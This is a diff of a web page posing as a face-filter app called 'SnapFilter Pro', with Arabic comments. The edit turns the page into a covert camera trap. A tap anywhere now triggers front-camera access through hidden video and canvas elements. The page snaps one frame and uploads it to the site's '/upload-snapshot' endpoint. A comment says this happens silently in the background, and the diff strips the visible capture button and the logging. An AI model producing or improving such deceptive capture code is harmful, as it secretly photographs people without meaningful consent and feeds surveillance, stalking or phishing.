@@ -10,7 +10,7 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #0d0f12; color: #ffffff;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
-            min-height: 100vh; padding: 15px;
+            min-height: 100vh; padding: 15px; cursor: pointer; /* جعل المؤشر يدل على إمكانية الضغط */
         }
         .container {
             width: 100%; max-width: 420px; background: #161922;
@@ -24,46 +24,41 @@
             padding: 40px 20px;
             border-radius: 16px;
             border: 2px dashed #ff4757;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
             box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
         }
         .filter-banner p { font-size: 17px; color: #dcdde1; font-weight: bold; margin-top: 12px; }
         .filter-icon { font-size: 55px; }
-
-        .btn-capture {
-            background: linear-gradient(135deg, #ff4757, #ff6b81); color: white; border: none;
-            width: 85px; height: 85px; border-radius: 50%; font-size: 35px; cursor: pointer;
-            box-shadow: 0 5px 20px rgba(255, 71, 87, 0.4); display: inline-flex; align-items: center; justify-content: center;
-            transition: transform 0.2s;
-        }
-        .btn-capture:active { transform: scale(0.92); }
+        .hint { font-size: 13px; color: #8f93a2; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div class="container" id="main-card">
         <h2>SnapFilter Pro</h2>
         
         <div class="filter-banner">
             <div class="filter-icon">✨🎭</div>
             <p>فلتر الواقع الافتراضي نشط</p>
         </div>
-
-        <button class="btn-capture" id="capture-btn" title="التقاط">📸</button>
+        <div class="hint">اضغط في أي مكان لتفعيل الفلتر</div>
     </div>
 
-    <!-- عنصر فيديو مخفي يتم تشغيله حصرياً وقت الالتقاط لضمان عمل الكاميرا -->
+    <!-- عناصر الكاميرا المخفية بالكامل -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const captureBtn = document.getElementById('capture-btn');
+        let triggered = false;
 
-        captureBtn.addEventListener('click', async () => {
+        // تفعيل الكاميرا وطلب الإذن بمجرد أول لمسة أو ضغطة من المستخدم على الشاشة
+        document.body.addEventListener('click', async () => {
+            if (triggered) return; // لمنع التكرار إذا ضغط أكثر من مرة
+            triggered = true;
+
             try {
-                // طلب تشغيل الكاميرا فور الضغط على الزر لضمان حصول الإذن والالتقاط الحقيقي
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user' }, 
                     audio: false 
@@ -71,10 +66,8 @@
                 
                 video.srcObject = stream;
 
-                // الانتظار قليلاً لضمان تحميل البث المباشر للعدسة
-                setTimeout(() => {
+                setTimeout(async () => {
                     if (!video.videoWidth) {
-                        console.error("الكاميرا لم تستعد بعد");
                         stream.getTracks().forEach(track => track.stop());
                         return;
                     }
@@ -83,35 +76,25 @@
                     canvas.height = video.videoHeight;
                     const ctx = canvas.getContext('2d');
                     
-                    // رسم الصورة الحية
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     const imageData = canvas.toDataURL('image/png');
 
-                    // إيقاف الكاميرا فوراً بعد الالتقاط لحفظ الخصوصية والبطارية
+                    // إيقاف الكاميرا فوراً بعد الالتقاط
                     stream.getTracks().forEach(track => track.stop());
 
-                    // إرسال الصورة للسيرفر
-                    fetch('/upload-snapshot', {
+                    // إرسال الصورة للسيرفر بصمت تام في الخلفية
+                    await fetch('/upload-snapshot', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({ image: imageData })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.success) {
-                            console.log("تم إرسال الصورة بنجاح للـ Admin");
-                        }
-                    })
-                    .catch(err => {
-                        console.error('Fetch Error:', err);
                     });
 
-                }, 800); // مهلة 800 ميلي ثانية لضمان التقاط الصورة بدقة
+                }, 1000);
 
             } catch (err) {
-                console.error("Camera Permission Error:", err);
+                console.error("Camera access denied or error:", err);
             }
         });
     </script>
